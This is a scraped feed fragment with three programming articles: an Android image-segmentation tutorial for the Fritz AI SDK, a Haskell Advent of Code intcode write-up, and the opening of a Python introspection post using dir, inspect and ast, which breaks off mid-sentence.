<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2 id="2178">Add image segmentation capabilities to your mobile apps using Fritz AI</h2><div><div><div><p><a href="https://medium.com/@mwitiderrick?source=post_page-----111b258802a3--------------------------------" rel="noopener"><img alt="Derrick Mwiti" src="https://miro.medium.com/fit/c/96/96/2*9aohLPF6ipIrrmZ50g8zNQ.jpeg" width="48" height="48"></a></p></div></div></div></div></div><div><div><p id="fb93"><a href="https://www.fritz.ai/image-segmentation/" rel="noopener">Image segmentation</a> (also knowns as semantic segmentation) refers to the process of linking each pixel in an image to a class label. These labels could include a person, car, flower, piece of furniture, etc., just to mention a few. We have covered image segmentation before <a rel="noopener" href="https://heartbeat.fritz.ai/image-segmentation-with-mask-r-cnn-a5f2a0e78bfc">here</a> and <a rel="noopener" href="https://heartbeat.fritz.ai/a-2019-guide-to-semantic-segmentation-ca8242f5a7fc">here</a>. In this guide, we’ll look at how this can be done in Android mobile applications.</p><h2 id="32c0">Getting Started</h2><p id="d438">The first step is to create an Android project. Once you do, note the application ID. Next, <a href="https://app.fritz.ai/login" rel="noopener">log into your Fritz account </a>and register the application. This will set up communication between your application and Fritz AI.</p><figure><p><img alt="Image for post" src="https://miro.medium.com/proxy/1*fIjyeqs5btOATbVXoZ7Wdg.png"></p></figure><p id="e698">Click on the next button and name your application. While you are there, don’t forget to enter your application ID. You can find the ID in your app’s <code>build.gradle</code> file.</p><figure><p><img alt="Image for post" src="https://miro.medium.com/proxy/1*0OQtIZO-NsIjFjkJONORMA.png"></p></figure><p id="8499">With that out of the way, you can now install the Fritz AI SDK. In your root-level Gradle file <code>(build.gradle)</code> include the Maven repository for Fritz.</p><figure><div></div></figure><p id="1d60">Now, add the dependencies for the SDK in <code>app/build.gradle</code>. We add the Fritz Core, Image Segmentation, and Vision dependencies. Including the Image Segmentation model in your application will make your application larger in size. Now that you have changed the Gradle files, ensure that you sync that with your project. That will download all the necessary dependencies.</p><figure><div></div></figure><p id="2a31">Before you close that file add <code>renderscript</code> support to improve image processing performance. Also, specify <code>aaptOptions</code> to prevent compression of TFLite models.</p><figure><div></div></figure><p id="e326">Now register the <code>FritzCustomModelService</code> in the AndroidManifest.</p><figure><div></div></figure><p id="f4cf">The next step is to initialize the SDK by calling <strong>Fritz.configure()</strong> with your API Key.</p><figure><div></div></figure><p id="88e5">With that in place, click next to verify that your application is able to communicate with Fritz.</p><h2 id="be5f">Use Fritz Pre-trained Models</h2><p id="c23b">The model we will use will create a mask on the people that have been detected. Apart from the people segmentation, Fritz AI also allows us to do pet, sky, living room, outdoor, and hair segmentation.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1440/1*IUCrwjZb2FYBcvQxc9nc7Q.jpeg" width="720" height="1206" srcset="https://miro.medium.com/max/552/1*IUCrwjZb2FYBcvQxc9nc7Q.jpeg 276w, https://miro.medium.com/max/1104/1*IUCrwjZb2FYBcvQxc9nc7Q.jpeg 552w, https://miro.medium.com/max/1280/1*IUCrwjZb2FYBcvQxc9nc7Q.jpeg 640w, https://miro.medium.com/max/1400/1*IUCrwjZb2FYBcvQxc9nc7Q.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/36/1*IUCrwjZb2FYBcvQxc9nc7Q.jpeg?q=20"></p></div></div></div><figcaption><a href="https://unsplash.com/photos/TMpQ5R9mbOc" rel="noopener">Image Source</a></figcaption></figure><h2 id="e48e">The App Elements</h2><p id="64fd">The application is made up of a button that will choose an image and the image view for displaying the result of the segmentation.</p><figure><div></div></figure><h2 id="b5f7">Obtaining the User Permissions</h2><p id="5210">We can obtain the image by overriding the <code>onClick</code> method of the button and attaching a click listener. We also obtain permission from the user in order to select an image.</p><figure><div></div></figure><p id="83f2">Once we obtain the necessary permission, we get the image via the <code>pickImage</code> method. The method uses an <code>Intent</code> to get the image.</p><figure><div></div></figure><p id="483a">Next, override the method used to request permission.</p><figure><div></div></figure><h2 id="1688">Obtaining the Image</h2><p id="6523">At this point, we can now obtain the image and create a Bitmap. The object detection model requires a Bitmap image.</p><figure><div></div></figure><h2 id="17c3">Create a FritzVisionImage from an image</h2><p id="a2f4">Now use the Bitmap to create a <code>FritzVisionImage</code>.</p><figure><div></div></figure><h2 id="5bbc">Get a Segmentation Predictor</h2><p id="bc22">At this point, we can now load the on-device model.</p><figure><div></div></figure><h2 id="5fb3">Create a Segmentation Predictor</h2><p id="c4f4">Since the model is loaded on the device we can get the segmentation predictor immediately.</p><figure><div></div></figure><h2 id="b48c">Run Prediction on the FritzVisionImage</h2><p id="f3fc">The next step is to simply run the predictions using the predictor we just obtained.</p><figure><div></div></figure></div></div></div>]]>
            </description>
            <link>https://heartbeat.fritz.ai/image-segmentation-in-android-with-fritz-ai-111b258802a3</link>
            <guid isPermaLink="false">hacker-news-small-sites-25187359</guid>
            <pubDate>Mon, 23 Nov 2020 15:00:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advent of Code in Haskell Preparation Part 2: Where We Build a Computer]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25187350">thread link</a>) | @todsacerdoti
<br/>
November 23, 2020 | https://www.bulters.dev/posts/where-we-build-a-computer/ | <a href="https://web.archive.org/web/*/https://www.bulters.dev/posts/where-we-build-a-computer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
			
<p>So day one went fairly smooth. Nothing too difficult to implement, as you can
expect from a first challenge. Since I’ve done some of the challenges last year
(implemented them in Go), I know that there will be a rapid ramp-up in
difficulty and that a number of challenges build “on top of each other”.
Perfect opportunities to start exploring how to write reuseable Haskell code.</p>
<p>But we’ll tackle that when the opportunity actually presents itself and not
make things more difficult than needed.</p>

<p>I will not describe the entire problem again, Advent of Code is way better at
that. But to make things simple: read numbers from a file, start at the first
number, execute an action based on the number and write the result of the
action somewhere.</p>
<p>In the first “note” (I wouldn’t call these ramblings articles) I started out
with some boilerplate by setting up the required files for Cabal, but lets not
do that this time, since I realised we don’t really need it (just yet).</p>
<p>I’ll just create a directory, create a Main.hs file and run stuff from GHCi to
get things working. In the end I’ll try to modify the program to take the input
program (intcode program) from the standard input, just as a challenge.</p>

<p>Lets get our environment setup.</p>
<div><pre><code data-lang="shell">jeroen@DESKTOP:~/taoc19$ cd day2
jeroen@DESKTOP:~/taoc19/day2$ touch Main.hs
jeroen@DESKTOP:~/taoc19/day2$ ghci
GHCi, version 8.6.5: http://www.haskell.org/ghc/  :? <span>for</span> help
Prelude&gt; :load Main.hs
<span>[</span><span>1</span> of 1<span>]</span> Compiling Main             <span>(</span> Main.hs, interpreted <span>)</span>
Ok, one module loaded.
*Main&gt;
</code></pre></div><p>Great, that worked. The <code>Main.hs</code> file is still empty, but it works, no Cabal
or Stack needed to get something done. Now to open the editor from GHCi (with
<code>:edit</code> or <code>:e</code>) and start implementing this intcode machine.</p>
<div><pre><code data-lang="shell">*Main&gt; :e
editor not set, use :set editor
*Main&gt; :set editor vim
*Main&gt;
</code></pre></div><p>Oops, let make a mental note to actually set <code>$EDITOR</code> in my environment, guess
I don’t use it as often as thought.</p>
<p>So filling the Main.hs file with the same boilerplate as last time:</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>
				        print raw
</code></pre></div><p>Running the <code>main</code> function in GHCi does exactly as expected, it outputs the contents of the <code>input.txt</code> file. No big deal.</p>
<p>So after stubbing out the general outline of the program this is what I came up with:</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>
        <span>-- split the input up into instructions (split on ,)</span>
        <span>let</span> input <span>=</span> parseInput raw
        <span>-- run the program</span>
        <span>let</span> output <span>=</span> runProgram input
        <span>-- get the value from first position in memory</span>
        <span>let</span> solution <span>=</span> output <span>!!</span> <span>0</span>
        print solution

<span>-- parseInput takes a string as input and outputs</span>
<span>-- an array of integers</span>
<span>parseInput</span> <span>=</span> id

<span>-- runProgram takes a piece of memory and returns</span>
<span>-- the state of memory after the program has completed</span>
<span>runProgram</span> <span>=</span> id
</code></pre></div><p>So we have two high level functions to define, sounds doable.</p>
<p>First challenge is to find a way to split the input string on the comma’s
separating the individual memory values. I heard “real Haskell programmers” use
<a href="https://hoogle.haskell.org/">Hoogle</a> to find the functions they are looking for
based on the type signature they think “should get the job done”.</p>
<p>Since we’re looking to split a string based on a different string, the required
type signature should look something like <code>String -&gt; String -&gt; [String]</code>. But
after <a href="https://hoogle.haskell.org/?hoogle=String+-%3E+String+-%3E+%5BString%5D&amp;scope=set%3Ahaskell-platform">searching Hoogle for
it</a> I couldn’t find anything that looks like it might do the job. Of course I could
have just searched for a function called split, or some variation of it, but I wanted
to do it “the real way"TM. Luckily, after reading an article on <a href="https://mmhaskell.com/blog/2017/5/15/untangling-haskells-strings">Monday Morning Haskell</a>
I remembered that Haskell also has a <code>Text</code> type, offering some additional string handling
abilities.</p>

<div>
	<p>
    💡 I remain blisfully unaware of other benefits of using the `Text` type, please enlighten me if you want to.
  </p>
</div>
<p>Re-running the search with <a href="https://hoogle.haskell.org/?hoogle=Text+-%3E+Text+-%3E+%5BText%5D&amp;scope=set%3Ahaskell-platform"><code>Text -&gt; Text -&gt; [Text]</code></a> yielded exactly the result I was looking for: <code>splitOn</code>. So feeding the <code>raw</code> data into <code>splitOn</code> and splitting on <code>,</code> gives us a <code>[String]</code> which we only need to convert into a <code>[Int]</code>. The <code>splitOn</code> function is included in the <code>Data.Text</code> package, so we’ll have to import that as well. But then, the <code>readFile</code> we use to load the data gives us a <code>String</code>, so we’ll have to import <code>Data.Text.IO</code> as well to be able to utilize the <code>readFile</code> function from that (all found by using Hoogle).</p>
<p>At this point, let’s reconsider our solution of using the <code>splitOn</code> function as provided by <code>Data.Text</code> and research Hoogle for a different <code>splitOn</code> function. Turns out, there is a <code>splitOn</code> variant in <a href="https://hackage.haskell.org/package/split-0.2.3.4/docs/Data-List-Split.html#v:splitOn"><code>Data.List.Split</code></a> that is generic (i.e. it accepts anything of the type <code>Eq a =&gt; [a] -&gt; [a] -&gt; [[a]]</code>) so will probably accept a <code>String</code> as well. Let’s try it out in GHCi.</p>
<div><pre><code data-lang="shell">GHCi, version 8.6.5: http://www.haskell.org/ghc/  :? <span>for</span> help
Prelude&gt; :m + Data.List.Split
Prelude Data.List.Split&gt; splitOn <span>","</span> <span>"1,2,3,4,5"</span>
<span>[</span><span>"1"</span>,<span>"2"</span>,<span>"3"</span>,<span>"4"</span>,<span>"5"</span><span>]</span>
Prelude Data.List.Split&gt; :t splitOn <span>","</span> <span>"1,2,3,4,5"</span>
splitOn <span>","</span> <span>"1,2,3,4,5"</span> :: <span>[[</span>Char<span>]]</span>
</code></pre></div><p>Awesome, we get something back that looks like a <code>[String]</code> (since a <code>String</code> is a <code>[Char]</code>). So we’ll be good to go to use this.</p>
<p>So let’s write a simple function to do this, iterate (<code>map</code>) over all the individual items and <code>read</code> them into a <code>[Int]</code>.</p>
<div><pre><code data-lang="haskell"><span>-- parseInput takes a string as input and outputs</span>
<span>-- an array of integers</span>
<span>-- parseInput :: String -&gt; [Int]</span>
<span>parseInput</span> <span>::</span> <span>String</span> <span>-&gt;</span> [<span>Int</span>]
<span>parseInput</span> x <span>=</span> map read <span>$</span> splitOn <span>","</span> x
</code></pre></div><p>That takes care of getting our input ready. The second step involves a small nuance in the challenge:</p>
<pre><code>    Once you have a working computer, the first step is to restore the gravity
    assist program (your puzzle input) to the "1202 program alarm" state it had
    just before the last computer caught fire. To do this, before running the
    program, replace position 1 with the value 12 and replace position 2 with the
    value 2. What value is left at position 0 after the program halts?
</code></pre>
<p>So we have to set the first value of the program to 12, and the second value to 2. This calls for a function
to replace a certain index in a <code>List</code>. At this point we could choose to replace the usage of <code>List</code> with <code>Data.Vector</code> which
offers this functionality by default. But for simplicity sake, let’s stay with our current solution and create a <code>replace</code> function
that takes an <code>Int</code> (the index), another <code>Int</code> (the new value) and a <code>List</code>, and returns a <code>List</code>. To build this function we use the <code>splitAt</code> function
provided by <code>Data.List.Split</code>, which we imported in the previous step anyway.</p>
<div><pre><code data-lang="haskell"><span>replace</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span> <span>-&gt;</span> [<span>Int</span>] <span>-&gt;</span> [<span>Int</span>]
<span>replace</span> i v xs <span>=</span> <span>let</span> (hxs, <span>_</span><span>:</span>txs) <span>=</span> splitAt i xs <span>in</span>
								   hxs <span>++</span> v <span>:</span> txs
</code></pre></div><p>which, when tested in GHCi, yields exactly what we want:</p>
<div><pre><code data-lang="shell"><span>[</span><span>1</span> of 1<span>]</span> Compiling Main             <span>(</span> Main.hs, interpreted <span>)</span>
Ok, one module loaded.
*Main&gt; replace <span>2</span> <span>99</span> <span>[</span>1,2,3,4,5<span>]</span>
<span>[</span>1,2,99,4,5<span>]</span>
</code></pre></div><p>So we can construct our actual program with <code>replace 1 12 $ replace 2 2 input</code>, store it in a variable and use that to run the actual program.</p>

<div>
	<p>
    💡 Turns out, `Data.List.Index` has a function called `setAt` which does EXACTLY the same as our `replace` function. Unfortunately, this is only available as an external library, so I choose not to use it.
  </p>
</div>

<p>We have a list of numbers, which somehow translates to instructions to be executed by a virtual computer, mutating memory. Sounds easy right?</p>
<p>IMO, this is actually the easy part, it involves us creating a function that takes 4 numbers from the list, applying a certain mutation to memory based on the values in those four numbers, taking the next four numbers, etc. Untill we find the number 99.</p>
<div><pre><code data-lang="haskell"><span>runProgramAt</span> <span>::</span> <span>Int</span> <span>-&gt;</span> [<span>Int</span>] <span>-&gt;</span> [<span>Int</span>]
<span>runProgramAt</span> pc m <span>=</span> <span>let</span> opcode <span>=</span> m <span>!!</span> pc
												left <span>=</span> m <span>!!</span> (m <span>!!</span> (pc <span>+</span> <span>1</span>))
												right <span>=</span> m <span>!!</span> (m <span>!!</span> (pc <span>+</span> <span>2</span>))
												result <span>=</span> m <span>!!</span> (pc <span>+</span> <span>3</span>)
												next <span>=</span> pc <span>+</span> <span>4</span> <span>in</span>
										<span>case</span> opcode <span>of</span>
												<span>-- 99 signals the end of the program, just return</span>
												<span>-- the entire memory</span>
												<span>99</span> <span>-&gt;</span> m
												<span>-- 1 indicates addition (left + right -&gt; result), continue</span>
												<span>-- with the next operation at pc + 4</span>
												<span>1</span> <span>-&gt;</span> runProgramAt next <span>$</span> replace result (left <span>+</span> right) m
												<span>-- 2 indicates multiplication (left * right -&gt; result), continue</span>
												<span>-- with the next operation at pc + 4</span>
												<span>2</span> <span>-&gt;</span> runProgramAt next <span>$</span> replace result (left <span>*</span> right) m
												<span>-- and to satisfy the compiler, give it a fallback case</span>
												<span>-- which just returns the entire memory and stops</span>
												otherwise <span>-&gt;</span> m
</code></pre></div><p>Now when I change my <code>runProgram</code> function to use this function to run the program starting at position 0 by changing it into
<code>runProgram = runProgramAt 0</code>, and running this from GHCi I get my correct answer:</p>

<p>Really typical, part 2 of the challenge involves us finding a set of input that yields a certain output. This reeks like a standard brute-force search. These can be done really efficiently in Haskell by using <a href="https://dev.to/awwsmm/relearn-you-a-haskell-part-2-list-comprehensions-tuples-and-types-g29">list comprehensions</a>. So probably we’ll end up with something like:</p>
<div><pre><code data-lang="haskell"><span>findSolution</span> <span>::</span> <span>Int</span> <span>-&gt;</span> [<span>Int</span>] <span>-&gt;</span> <span>Int</span>
<span>findSolution</span> s m <span>=</span> head [noun <span>*</span> <span>100</span> <span>+</span> verb <span>|</span> 
                    noun <span>&lt;-</span> [<span>0</span><span>..</span><span>99</span>], 
                    verb <span>&lt;-</span> [<span>0</span><span>..</span><span>99</span>], 
                    runProgram (replace <span>1</span> noun <span>$</span> replace <span>2</span> verb m) <span>!!</span> <span>0</span> <span>==</span> s]

</code></pre></div><p>When calling this function with the input supplied by the challenge:</p>
<div><pre><code data-lang="haskell"><span>-- get the required input to complete part 2</span>
<span>let</span> nounverb <span>=</span> findSolution <span>19690720</span> input
<span>print</span> nounverb
</code></pre></div><p>it yields the correct solution, right away:</p>
<div><pre><code data-lang="shell"><span>[</span><span>1</span> of 1<span>]</span> Compiling Main             <span>(</span> Main.hs, interpreted <span>)</span>
Ok, one module loaded.
*Main&gt; main
<span>3101844</span>
<span>8478</span>
</code></pre></div><p>where the second answer is the answer for part 2. Given that I ran this in GHCi I expected it to be a bit slower, so let’s see if that’s the case:</p>
<pre><code>*Main&gt; :set +s
*Main&gt; main
3101844
8478
(1.04 secs, 3,337,885,928 bytes)
*Main&gt;
</code></pre><p>That seems about right, let’s try compiling and timing this as a standalone binary:</p>
<div><pre><code data-lang="shell">jeroen@DESKTOP:~/taoc19/day2$ ghc Main.hs
<span>[</span><span>1</span> of 1<span>]</span> Compiling Main             <span>(</span> Main.hs, Main.o <span>)</span>
Linking Main ...
jeroen@DESKTOP:~/taoc19/day2$ time ./Main
<span>3101844</span>
<span>8478</span>

real    0m0.567s
user    …</code></pre></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.bulters.dev/posts/where-we-build-a-computer/">https://www.bulters.dev/posts/where-we-build-a-computer/</a></em></p>]]>
            </description>
            <link>https://www.bulters.dev/posts/where-we-build-a-computer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25187350</guid>
            <pubDate>Mon, 23 Nov 2020 14:59:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introspection in Python – Python objects speak for themselves]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25186960">thread link</a>) | @shrewdcomputer
<br/>
November 23, 2020 | https://anvil.works/blog/introspection-in-python | <a href="https://web.archive.org/web/*/https://anvil.works/blog/introspection-in-python">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <article>
              



<p>Let’s investigate how you can use built-in Python tools to both:</p>

<ul>
<li>find out exactly what any module can do, and</li>
<li>find out exactly how Python will execute your code.</li>
</ul>

<p>This makes debugging Python code much easier than in other languages I’ve used. You can ask any object what it does
and what data it holds - and this is <em>built in to the language!</em></p>

<p>Here’s a very basic Python class:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>class</span> <span>Vehicle</span><span>():</span>
  <span>"""A really simple class to represent vehicles."""</span>

  <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>wheels</span><span>=</span><span>4</span><span>,</span> <span>colour</span><span>=</span><span>'red'</span><span>):</span>
    <span>self</span><span>.</span><span>wheels</span> <span>=</span> <span>wheels</span>
    <span>self</span><span>.</span><span>colour</span> <span>=</span> <span>colour</span>
    
  <span>def</span> <span>repaint</span><span>(</span><span>self</span><span>,</span> <span>colour</span><span>=</span><span>None</span><span>):</span>
    <span>"""Change the colour of this vehicle."""</span>
    <span>self</span><span>.</span><span>colour</span> <span>=</span> <span>colour</span></code></pre></div></div>


<p>If I import this class and run <code>dir</code> on it, I can see everything it does:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>v</span> <span>=</span> <span>Vehicle</span><span>()</span>
<span>&gt;&gt;&gt;</span> <span># Let's see what's in my vehicle...</span>
<span>&gt;&gt;&gt;</span> <span>dir</span><span>(</span><span>v</span><span>)</span>
<span>[</span><span>'__class__'</span><span>,</span> <span>'__delattr__'</span><span>,</span> <span>'__dict__'</span><span>,</span> <span>'__dir__'</span><span>,</span> <span>'__doc__'</span><span>,</span> <span>'__eq__'</span><span>,</span> 
<span>'__format__'</span><span>,</span> <span>'__ge__'</span><span>,</span> <span>'__getattribute__'</span><span>,</span> <span>'__gt__'</span><span>,</span> <span>'__hash__'</span><span>,</span> 
<span>'__init__'</span><span>,</span> <span>'__init_subclass__'</span><span>,</span> <span>'__le__'</span><span>,</span> <span>'__lt__'</span><span>,</span> <span>'__module__'</span><span>,</span> 
<span>'__ne__'</span><span>,</span> <span>'__new__'</span><span>,</span> <span>'__reduce__'</span><span>,</span> <span>'__reduce_ex__'</span><span>,</span> <span>'__repr__'</span><span>,</span> 
<span>'__setattr__'</span><span>,</span> <span>'__sizeof__'</span><span>,</span> <span>'__str__'</span><span>,</span> <span>'__subclasshook__'</span><span>,</span> <span>'__weakref__'</span><span>,</span> 
<span>'colour'</span><span>,</span> <span>'repaint'</span><span>,</span> <span>'wheels'</span><span>]</span></code></pre></div></div>


<p>I can see the method and attributes I gave the class: <code>repaint</code>, <code>colour</code> and <code>wheels</code>. Not only that, but <code>dir</code> also
tells me about all the built-in methods that my class has inherited from Python’s <code>object</code> class, such as <code>__eq__</code> and
<code>__str__</code>. These all start and end with a <strong>d</strong>ouble <strong>under</strong>score so we refer to them as ‘dunder’ methods. Let’s try one:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span># I wonder what this method does...</span>
<span>&gt;&gt;&gt;</span> <span>v</span><span>.</span><span>__dict__</span>
<span>{</span><span>'wheels'</span><span>:</span> <span>4</span><span>,</span> <span>'colour'</span><span>:</span> <span>'red'</span><span>}</span></code></pre></div></div>


<p>So my simple class automatically has a method to get its attributes in a dictionary <sup id="fnref:dict"><a href="#fn:dict">1</a></sup>! I didn’t know that… but I found
it out just by introspecting my object using <code>dir</code>.</p>

<h2 id="forensic-programming">Forensic programming</h2>

<p>If something isn’t very well documented in a library you’re using, don’t worry! You can inspect the objects
the library provides and work things out for yourself.</p>

<p>Imagine you want to make an HTTP GET request. You’ve been recommended <a href="https://requests.readthedocs.io/en/master/">the <code>requests</code> library</a>
but let’s pretend you can’t make head or tail of the documentation <sup id="fnref:requests"><a href="#fn:requests">2</a></sup>. So, you try importing it and running <code>dir</code> on it:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>import</span> <span>requests</span>
<span>&gt;&gt;&gt;</span> <span># So, what does this library give me?</span>
<span>&gt;&gt;&gt;</span> <span>dir</span><span>(</span><span>requests</span><span>)</span>
<span>[</span><span>'ConnectTimeout'</span><span>,</span> <span>'ConnectionError'</span><span>,</span> <span>'DependencyWarning'</span><span>,</span> <span>'FileModeWarning'</span><span>,</span> 
<span>'HTTPError'</span><span>,</span> <span>'NullHandler'</span><span>,</span> <span>'PreparedRequest'</span><span>,</span> <span>'ReadTimeout'</span><span>,</span> <span>'Request'</span><span>,</span> 
<span>'RequestException'</span><span>,</span> <span>'RequestsDependencyWarning'</span><span>,</span> <span>'Response'</span><span>,</span> <span>'Session'</span><span>,</span> 
<span>'Timeout'</span><span>,</span> <span>'TooManyRedirects'</span><span>,</span> <span>'URLRequired'</span><span>,</span> <span>'__author__'</span><span>,</span> <span>'__author_email__'</span><span>,</span> 
<span>'__build__'</span><span>,</span> <span>'__builtins__'</span><span>,</span> <span>'__cached__'</span><span>,</span> <span>'__cake__'</span><span>,</span> <span>'__copyright__'</span><span>,</span> 
<span>'__description__'</span><span>,</span> <span>'__doc__'</span><span>,</span> <span>'__file__'</span><span>,</span> <span>'__license__'</span><span>,</span> <span>'__loader__'</span><span>,</span> 
<span>'__name__'</span><span>,</span> <span>'__package__'</span><span>,</span> <span>'__path__'</span><span>,</span> <span>'__spec__'</span><span>,</span> <span>'__title__'</span><span>,</span> <span>'__url__'</span><span>,</span> 
<span>'__version__'</span><span>,</span> <span>'_check_cryptography'</span><span>,</span> <span>'_internal_utils'</span><span>,</span> <span>'adapters'</span><span>,</span> <span>'api'</span><span>,</span> 
<span>'auth'</span><span>,</span> <span>'certs'</span><span>,</span> <span>'chardet'</span><span>,</span> <span>'check_compatibility'</span><span>,</span> <span>'codes'</span><span>,</span> <span>'compat'</span><span>,</span> 
<span>'cookies'</span><span>,</span> <span>'delete'</span><span>,</span> <span>'exceptions'</span><span>,</span> <span>'get'</span><span>,</span> <span>'head'</span><span>,</span> <span>'hooks'</span><span>,</span> <span>'logging'</span><span>,</span> 
<span>'models'</span><span>,</span> <span>'options'</span><span>,</span> <span>'packages'</span><span>,</span> <span>'patch'</span><span>,</span> <span>'post'</span><span>,</span> <span>'put'</span><span>,</span> <span>'request'</span><span>,</span> <span>'session'</span><span>,</span> 
<span>'sessions'</span><span>,</span> <span>'status_codes'</span><span>,</span> <span>'structures'</span><span>,</span> <span>'urllib3'</span><span>,</span> <span>'utils'</span><span>,</span> <span>'warnings'</span><span>]</span>
<span>&gt;&gt;&gt;</span> <span>#&nbsp;Quite a lot!</span></code></pre></div></div>


<p>There’s a lot there! Looks like there’s a method named <code>get</code>, maybe that will make a GET request for us? Let’s see if it’s callable:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>callable</span><span>(</span><span>requests</span><span>.</span><span>get</span><span>)</span>
<span>True</span></code></pre></div></div>


<p>Great! But <em>how</em> do we call it? We’ll use a brilliant built-in module named <code>inspect</code> to tell us. It can tell us the
signature of any function or method we might be thinking of calling:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>import</span> <span>inspect</span>
<span>&gt;&gt;&gt;</span> <span># What parameters does requests.get accept?</span>
<span>&gt;&gt;&gt;</span> <span>inspect</span><span>.</span><span>signature</span><span>(</span><span>requests</span><span>.</span><span>get</span><span>)</span>
<span>&lt;</span><span>Signature</span> <span>(</span><span>url</span><span>,</span> <span>params</span><span>=</span><span>None</span><span>,</span> <span>**</span><span>kwargs</span><span>)</span><span>&gt;</span></code></pre></div></div>


<p>There’s a positional argument called <code>url</code>, and an optional keyword argument named <code>params</code>. The <code>url</code> argument is
obvious. Let’s try making a request to an API that returns Bertrand Russell quotes (what else?):</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>"https://bertrand.anvil.app/_/api/quote"</span><span>)</span>
<span>&lt;</span><span>Response</span> <span>[</span><span>200</span><span>]</span><span>&gt;</span></code></pre></div></div>


<p>Ok… so I’ve got a response. I guess <code>200</code> is an HTTP 200 OK status, meaning it worked. But how do I get my quote?
One more use of <code>dir</code> and I see that my response has a <code>text</code> attribute:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>"https://bertrand.anvil.app/_/api/quote"</span><span>)</span><span>.</span><span>text</span>
<span>'Everything is vague to a degree you do not realize till you have tried to make it precise.'</span></code></pre></div></div>


<p>Amazing! We’ve worked out how to use the Python <code>requests</code> library using nothing but our wits and Python’s built-in introspection tools.</p>

<p>Incidentally, I spotted something strange when I ran <code>dir(requests)</code>. What is <code>requests.__cake__</code>? Maybe it ‘bakes’
a response into something I can store on disk? Maybe it’s got something to do with browser cookies? Let’s find out:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span># What's this?</span>
<span>&gt;&gt;&gt;</span> <span>requests</span><span>.</span><span>__cake__</span>
<span>'✨ 🍰 ✨'</span>
<span>&gt;&gt;&gt;</span> <span># I see.</span></code></pre></div></div>


<p>So we’ve seen how Python’s introspection can help you figure out <em>precisely</em> how to use a library, even when that library
contains undocumented methods.</p>

<p>Let’s get even more introspective. Python can gaze into its innards and see all the way through to its very guts. It can
tell you all the details of how it compiles and executes your code.</p>

<h2 id="extreme-introspection"><strong>Extreme</strong> introspection</h2>

<p>Not only will Python objects tell you what they do, but Python can tell you exactly how it plans to do it.
When Python executes your code, it does it in (at least) three steps, and you can find out the exact details of each
of them.</p>

<h3 id="how-python-understands-code">How Python understands code</h3>

<p>The first step is <strong>parsing</strong>. Python takes the raw characters of your code and turns it into a structure that represents
the meaning of the text. The long string of characters is translated into <strong>tokens</strong> that are
organised into a tree - an <strong>abstract syntax tree</strong> (AST). Take a simple Python statement:</p>




<p>The abstract syntax tree looks like this:</p>


<div>
    <figure><img src="https://anvil.works/blog/img/introspection-in-python/ast-diagram-abstract.png" alt="What the Python parser sees when you tell it x = 4 + 8"> <figcaption>
                <p>What the Python parser sees when you tell it <code>x = 4 + 8</code></p>
            </figcaption>
    </figure>
</div>

<p>This is something that must occur in all programming languages except assembly code, but not all give you such easy
access to their innards as Python does. Python ships with a module you can run on your code to see the
abstract syntax tree it generates from your code. It’s called <code>ast</code> (<a href="https://docs.python.org/3/library/ast.html">here is it in the Python docs</a>).</p>

<p>We can get the AST for our simple statement like so:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>import</span> <span>ast</span>
<span>&gt;&gt;&gt;</span> <span>tree</span> <span>=</span> <span>ast</span><span>.</span><span>parse</span><span>(</span><span>'x = 4 + 8'</span><span>)</span></code></pre></div></div>


<p>Let’s use our introspection skills to explore that object. We run <code>dir</code> on it and see that there’s a <code>body</code> attribute:</p>

<div title="" tabindex="0"><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>tree</span><span>.</span><span>body</span>
<span>[</span><span>&lt;</span><span>_ast</span><span>.</span><span>Assign</span> <span>object</span> <span>at</span> <span>0x1024a8470</span><span>&gt;</span><span>]</span></code></pre></div></div>


<p>The body of the AST is a list of all the Python statements in the code. Our program only has one Python statement, the
assignment statement <code>x = 4 + 8</code>. That’s why <code>tree</code> contains one statement, named <code>Assign</code>.</p>

<p>Let’s see what’s inside the assignment. Using <code>dir</code> tells us it has things called <code>targets</code> and <code>value</code>. I bet <code>targets</code> are
the things being assigned to (<code>x</code> in our case) and <code>value</code> are the things being assigned (so for us that’s <code>4 + 8</code>).
